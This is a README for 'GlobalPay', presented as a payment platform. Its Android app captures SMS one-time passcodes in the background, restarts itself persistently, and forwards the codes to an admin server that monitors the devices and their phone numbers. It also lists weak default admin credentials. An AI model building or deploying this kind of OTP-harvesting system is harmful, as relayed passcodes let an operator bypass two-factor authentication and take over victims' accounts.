# GlobalPay - Payment Platform with OTP Monitoring

A comprehensive payment platform with device activation, OTP monitoring, and merchant management.

## 🚀 Features

- **Admin Dashboard**: Comprehensive merchant and payment management
- **Device Activation System**: Secure mobile app activation with unique codes
- **OTP Monitoring**: Real-time SMS OTP capture and monitoring
- **Payment Processing**: Multi-gateway payment routing and processing
- **Merchant Management**: Complete merchant onboarding and management
- **Real-time Telemetry**: Device status monitoring and analytics

## 📁 Project Structure

```
globalpay-shareable/
├── website/                 # Next.js frontend + Flask backend
│   ├── app/                # Next.js pages and components
│   ├── backend/            # Flask API and database models
│   ├── components/         # React components
│   └── instance/           # SQLite database
│
└── auto-otp/               # Android mobile app
    └── app/                # Kotlin source code
```

## 🛠️ Installation

### Backend (Flask)

1. Install Python dependencies:
```bash
pip install -r requirements.txt
```

2. Set up environment variables:
```bash
cd website
cp .env.example .env
# Edit .env with your configuration
```

3. Run the Flask server:
```bash
cd website
python flask_app.py
```

Server will run on `http://0.0.0.0:5000`

### Frontend (Next.js)

1. Install Node.js dependencies:
```bash
cd website
npm install
```

2. Run the development server:
```bash
npm run dev
```

Dashboard will run on `http://localhost:3000`

### Mobile App (Android)

1. Open `auto-otp` folder in Android Studio
2. Update `MONITORING_BASE_URL` in `local.properties`:
```properties
MONITORING_BASE_URL=http://YOUR_SERVER_IP:5000
```
3. Build and install APK on device

## 📱 Device Activation System

### Admin Panel
- Generate unique 8-character activation codes
- Monitor device activation status
- Reset codes to revoke device access
- View device telemetry and phone numbers

### Mobile App
- First-time activation with unique code
- Phone number verification
- Auto-restart background services
- Real-time OTP capture and forwarding
- Device telemetry reporting

## 🔐 Admin Access

Default admin credentials:
- Email: `admin@wpay.com`
- Password: `admin123`

⚠️ Change these credentials in production!

## 🗄️ Database

The application uses SQLite database stored at:
```
website/instance/Wpay.sqlite3
```

## 📋 Requirements

- **Python**: 3.8+
- **Node.js**: 18+
- **Android Studio**: Latest version for mobile app
- **Android Device**: API 26+ (Android 8.0+)

## 🔧 Configuration

### Backend Configuration
Edit `website/.env`:
```env
FLASK_ENV=development
DATABASE_URL=sqlite:///instance/Wpay.sqlite3
SECRET_KEY=your-secret-key
```

### Frontend Configuration
Edit `website/.env.local`:
```env
NEXT_PUBLIC_API_URL=http://localhost:5000
```

### Mobile App Configuration
Edit `auto-otp/local.properties`:
```properties
MONITORING_BASE_URL=http://192.168.1.2:5000
```

## 🚦 Usage Flow

1. **Admin generates activation code** in admin panel
2. **User installs mobile app** and enters activation code
3. **User verifies phone number** via SMS
4. **App starts monitoring OTPs** in background
5. **OTPs are forwarded** to server in real-time
6. **Admin monitors** device status and OTP messages

## 📊 Admin Panel Routes

- `/admin/dashboard` - Main dashboard
- `/admin/activation-codes` - Device activation management
- `/admin/otp-devices` - OTP device monitoring
- `/admin/merchants` - Merchant management
- `/admin/transactions` - Payment transactions
- `/admin/analytics` - Analytics and reports

## 🔄 Background Services

The mobile app uses:
- **AlarmManager**: For periodic service restarts
- **Foreground Services**: For persistent operation
- **Boot Receiver**: Auto-start on device boot
- **Network Monitor**: Internet connectivity tracking

## 📝 API Endpoints

### Public Endpoints
- `POST /api/activation-codes/verify` - Verify activation code
- `POST /api/activation-codes/save-phone` - Save phone number
- `POST /api/otp/report` - Report OTP message

### Admin Endpoints (require authentication)
- `POST /api/admin/activation-codes/generate` - Generate code
- `GET /api/admin/activation-codes` - List codes
- `POST /api/admin/activation-codes/:id/reset` - Reset code
- `GET /api/admin/otp/devices` - List OTP devices

## 🛡️ Security

- Device activation required before use
- One-time use activation codes
- Admin can revoke device access anytime
- Secure API authentication with JWT
- HTTPS recommended for production

## 📞 Support

For issues or questions, contact the development team.

## 📄 License

Proprietary - All rights reserved
